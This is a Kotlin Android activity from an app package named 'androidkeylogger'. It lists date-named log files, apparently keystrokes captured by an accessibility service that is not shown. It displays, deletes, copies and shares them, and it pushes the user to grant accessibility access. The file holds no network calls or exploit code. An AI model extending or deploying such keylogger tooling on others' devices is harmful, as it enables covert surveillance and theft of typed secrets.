package com.azamovhudstc.androidkeylogger

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.*
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.runBlocking
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.nio.charset.StandardCharsets
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

class MainFixActivity : AppCompatActivity() {
    private var textView: TextView? = null
    private var dateSpinner: Spinner? = null
    private var selectedItem = ""
    private var v: String? = null
    private val listHistory: MutableList<String> = ArrayList()
    private var x = false

    private inner class SpinnerItemSelectedListener : AdapterView.OnItemSelectedListener {
        override fun onItemSelected(adapterView: AdapterView<*>?, view: View, i: Int, j: Long) {
            selectedItem = listHistory[i]
            selectedItemRead(selectedItem)
        }

        override fun onNothingSelected(adapterView: AdapterView<*>?) {
            selectedItem = ""
            textView!!.text = ""
        }
    }

    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            } else if (!x) {
                x = true
                showDisclosureDialog()
            }
        }
    }

    private fun showDisclosureDialog() {
        val builder = AlertDialog.Builder(this)
        builder.setTitle(getString(R.string.disclosure))
        builder.setCancelable(false)
        val stringBuilder = StringBuilder()
        stringBuilder.append(getString(R.string.using_accessibility))
        stringBuilder.append("\n\n")
        stringBuilder.append(getString(R.string.purpose))
        builder.setMessage(stringBuilder.toString())
        builder.setNegativeButton(
            getString(R.string.cancel)
        ) { dialog, which -> dismissDialog(dialog, which) }
        builder.setPositiveButton(
            getString(R.string.accept)
        ) { dialog, which -> dismissDialog(dialog, which) }
        builder.show()
    }

    private fun getDate(str: String): Date {
        return try {
            SimpleDateFormat("yyyyMMdd", Locale.getDefault()).parse(str)
        } catch (unused: Exception) {
            Date(0)
        }
    }

    private fun dismissDialog(dialogInterface: DialogInterface, i: Int) {
        x = false
        dialogInterface.dismiss()
    }


    private fun dialogPositiveClick(dialogInterface: DialogInterface, i: Int) {
        if (selectedItem.isNotEmpty()) {
            if (File(v, selectedItem).delete()) {
                val svcAcc = SvcAccFix.h
                svcAcc?.let {
                    if (it.child == selectedItem) {
                        it.resetData()
                    }
                }
                initDate()
                return
            }
            Toast.makeText(this, getString(R.string.not_deleted), Toast.LENGTH_LONG).show()
        }
    }

    @SuppressLint("ResourceType")
    private fun initDate() {
        val obj: Any = if (dateSpinner!!.selectedItem != null) listHistory[dateSpinner!!.selectedItemPosition] else ""
        listHistory.clear()
        val arrayList = ArrayList<String>()
        val listFiles = File(v).listFiles()

        listFiles?.let {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(listFiles, Comparator.reverseOrder())
            }

            for (name in listFiles) {
                val name2 = name.name
                val U = getDate(name2)
                if (U.time > 0) {
                    listHistory.add(name2)
                    arrayList.add(DateFormat.getDateInstance(2).format(U))
                }
            }
        }

        dateSpinner!!.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, arrayList)

        if (listHistory.size > 0) {
            var indexOf = listHistory.indexOf(obj)
            if (indexOf < 1) {
                selectedItem = listHistory[0]
                indexOf = 0
            }
            dateSpinner!!.setSelection(indexOf, false)
        } else {
            selectedItem = ""
            textView!!.text = ""
        }

        invalidateOptionsMenu()
    }

    private fun selectedItemRead(str: String) {
        val file = File(v, str)
        val stringBuilder = StringBuilder()
        try {
            BufferedReader(FileReader(file)).use { bufferedReader ->
                while (true) {
                    val readLine = bufferedReader.readLine() ?: break
                    stringBuilder.append(readLine)
                    stringBuilder.append("\n")
                }
            }
            val svcAcc = SvcAccFix.h
            svcAcc?.let {
                if (it.child == str) {
                    stringBuilder.append(it.writeString() ?: "")
                }
            }
            textView!!.text = stringBuilder
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        setContentView(R.layout.activity_main)
        v = filesDir.absolutePath
        dateSpinner = findViewById<View>(R.id.dropdown) as Spinner
        textView = findViewById<View>(R.id.textview) as TextView
        dateSpinner!!.onItemSelectedListener = SpinnerItemSelectedListener()

        val lastUpdateTime: Long = try {
            packageManager.getPackageInfo(packageName, 0).lastUpdateTime
        } catch (unused: Exception) {
            Calendar.getInstance().timeInMillis - 300001
        }




        if (Calendar.getInstance().timeInMillis - lastUpdateTime > 600000) {
        }
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.btn, menu)
        return true
    }

    override fun onOptionsItemSelected(menuItem: MenuItem): Boolean {
        when (menuItem.itemId) {
            R.id.action_delete -> {
                showDeleteDialog()
            }
            R.id.action_copy -> {
                copyToClipboard()
            }
            R.id.action_share -> {
                shareContent()
            }
        }
        return super.onOptionsItemSelected(menuItem)
    }

    private fun showDeleteDialog() {
        val builder = AlertDialog.Builder(this)
        builder.setMessage(getString(R.string.ask_delete))
        builder.setCancelable(true)
        builder.setPositiveButton(
            getString(R.string.ok)
        ) { dialog, which -> dialogPositiveClick(dialog, which) }
        builder.setNegativeButton(
            getString(R.string.cancel)
        ) { dialog, which -> dismissDialog(dialog, which) }
        builder.show()
    }

    private fun copyToClipboard() {
        val clipboardManager =
            applicationContext.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        if (clipboardManager != null) {
            try {
                clipboardManager.setPrimaryClip(
                    ClipData.newPlainText(
                        getString(R.string.content_copied),
                        textView!!.text
                    )
                )
            } catch (e: Exception) {
                Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun shareContent() {
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "text/plain"
            putExtra(Intent.EXTRA_SUBJECT, getString(R.string.content_shared))
            putExtra(Intent.EXTRA_TEXT, textView!!.text)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
        }
        startActivity(Intent.createChooser(intent, getString(R.string.share)))
    }

    override fun onPrepareOptionsMenu(menu: Menu): Boolean {
        menu.clear()
        menuInflater.inflate(R.menu.btn, menu)
        return super.onPrepareOptionsMenu(menu)
    }

    override fun onResume() {
        super.onResume()
        initDate()
        checkPermission()
    }
}
